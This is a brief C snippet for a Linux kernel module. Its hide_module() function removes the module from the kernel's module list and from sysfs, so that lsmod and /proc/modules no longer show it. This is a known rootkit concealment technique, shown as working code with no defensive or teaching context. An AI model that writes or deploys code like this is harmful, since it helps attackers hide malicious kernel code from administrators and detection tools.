#include <linux/module.h>
#include <linux/list.h>

void hide_module(void) {
    // Remove this module from the global module list.
    // This makes it invisible to lsmod and /proc/modules.
    list_del_init(&THIS_MODULE->list);
    // Also remove from kobject hierarchy (sysfs).
    kobject_del(&THIS_MODULE->mkobj.kobj);
}